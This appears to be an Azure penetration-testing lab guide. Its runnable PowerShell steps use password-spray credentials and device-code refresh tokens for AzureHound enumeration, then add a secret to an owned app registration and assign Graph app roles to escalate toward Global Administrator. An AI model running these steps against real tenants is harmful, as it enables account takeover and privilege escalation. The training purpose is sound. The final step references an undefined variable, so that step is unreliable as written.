


### Task 1 - Enumerate the environment using AzureHound and a user with reader permissions

1. Review the credentials that we will use for this exercise. Run the command below to print the information in the file `Lab04-Info.txt` to the console. 
```
Get-Content "$HOME\Desktop\ExerciseFiles\Modules\04\Lab04-Info.txt" 
```

2. Authenticate to Azure PowerShell using the credentials. Replace the placeholders with the actual values from the exercise file.
```
$username = "USERNAME"
$password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential($username, $password)

Connect-AzAccount -Credential $cred
```

3. Copy the code from the PowerShell window and paste it into the PowerShell console. 
* This initiates a device code authentication flow.
* Follow the instruction by going to https://microsoft.com/devicelogin, pasting the code from the shell, and authenticating with the first user from your password spray result.
```
$body = @{
    "client_id" =     "1950a258-227b-4e31-a9cf-717495945fc2"
    "resource" =      "https://graph.microsoft.com"
}
$UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
$Headers=@{}
$Headers["User-Agent"] = $UserAgent
$authResponse = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$authResponse
```

4. Copy the code below and paste into the PowerShell console to retrieve the tokens and store them in a variable.
```
$body=@{
    "client_id" =  "1950a258-227b-4e31-a9cf-717495945fc2"
    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
    "code" =       $authResponse.device_code
}
$Tokens = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$Tokens
```

5. Run the command below to remove any space in the token.
```
$cleanToken = $tokens.refresh_token -replace ' ', ''
$context = Get-AzContext
$tenantId = $context.Tenant.Id
```

6. Run the command below to use AzureHound to enumerate the tenant using the refresh token.
* **`-r`**: refresh token
* **`--tenant`**: tenant ID
* **`-v`**: verbosity level (2 is the highest)
* **`-o`**: output file
```
cd "$env:SystemDrive\PentestTools\Azure\Attack\AzureHound"
./azurehound -r "$cleanToken" list --tenant "$tenantId" -v 2 -o azurehound-output-1.json
```

7. Log out as the reader user in Azure PowerShell.
```
Disconnect-AzAccount
```

### Task 2 - Import the data into BloodHound
1. Open a browser on your pentest VM, navigate to https://localhost:8080 and sign in (the credentials are already saved in the browser)
* In the top right corner, click on the settings icon ⚙️ → Administration
* From the left menu under Data Collection, select **`File Ingest`**
* Click the button UPLOAD FILE(S)
* Either drag-drop the `azurehound-output-1.json` that was generated in the previous step or click the upload window and select it from file explorer
* Click on Upload twice to confirm the upload, then click on CLOSE.


### Task 3 - Explore and exploit attack paths for the first user
1. Review the first user in your spray results list. You can explore that list using the following command:
```
Get-Content "$env:SystemDrive\PentestTools\Azure\Attack\MSOLSpray\sprayresults.txt"
```

2. Authenticate to Azure PowerShell as the credentials. Replace the placeholders **`USERNAME`** and **`PASSWORD`** with the actual values from the spray results text file.
```
# Extract the Tenant ID from the context
$currentContext = Get-AzContext
$tenantId = $currentContext.Tenant.Id

# Connect to Azure Cloud and Azure Active Directory
$username = "USERNAME"
$password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)

Connect-AzAccount -Credential $cred
Connect-AzureAD -Credential $cred
```

3. In the BloodHound GUI, click on PATHFINDING and enter the following results, click on the user and then click on the **Paths** tab.
* **`Start Node`**: the first user in your spray results list
* **`End Node`**: Global Administrator

4. Step 1: the user → AZOwns → Cloud Pulse
* This means that the user is configured as an owner of the application Cloud Pulse
* We can confirm this in Azure Portal → Entra ID → Manage → App Registration → All Applications → Cloud Pulse → Manage → Owners
* This means the user can add a new secret to the application and then authenticate as the application. Let's do this using PowerZure.

```
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force

Import-Module "$env:SystemDrive\PentestTools\Azure\Attack\Powerzure\Powerzure.psd1"

Add-AzureADSPSecret -ApplicationName "CloudPulse"
```

5. This adds a new secret to the application. We can now authenticate as the application using the command provideds in the output of the previous command. Copy the commands and paste them into the PowerShell console. The commands should be similar to what we have below (but copy and paste the actual putput and not the one below).
```
$ApplicationId = "APP_ID"
$SecurePassword = "APP_SECRET"
$SecurePassword = ConvertTo-SecureString -String $SecurePassword -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $ApplicationId, $SecurePassword
Connect-AzAccount -Credential $Credential -Tenant "TENANT_ID" -ServicePrincipal
```

6. Step 2: CloudPulse@Default Directory → AZPrivilegedRoleAdmin → Default Directory
* This means that App has a privileged role assignment to the tenant and we can use this to escalate privileges E.g. Assign ourselves as a global admin.
* We can confirm this in Azure Portal → Entra ID → Manage → App Registration → All Applications → Cloud Pulse → Manage → Roles and administrators
* The Cloud Application Administrator role has permissions to add addional permissions to registered apps [https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference#cloud-application-administrator](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference#cloud-application-administrator)
* Let's do this using the Microsoft Graph PowerShell.

```
Connect-MgGraph -ContextScope CurrentUser

Import-Module Microsoft.Graph.Applications

$params = @{
	principalId = "$ApplicationId"
	resourceId = "2cab1707-656d-40cc-8522-3178a184e03d"
	appRoleId = "741f803b-c850-494e-b5df-cde7c675a1ca"
}

New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $servicePrincipalId -BodyParameter $params
```

### REFERENCES
* https://learn.microsoft.com/en-us/graph/permissions-reference#see-also
* https://learn.microsoft.com/en-us/powershell/microsoftgraph/tutorial-grant-app-only-api-permissions?view=graph-powershell-1.0
* https://learn.microsoft.com/en-us/graph/permissions-reference#userreadwriteall
* https://matthewdavis111.com/msgraph/azure-ad-permission-details/


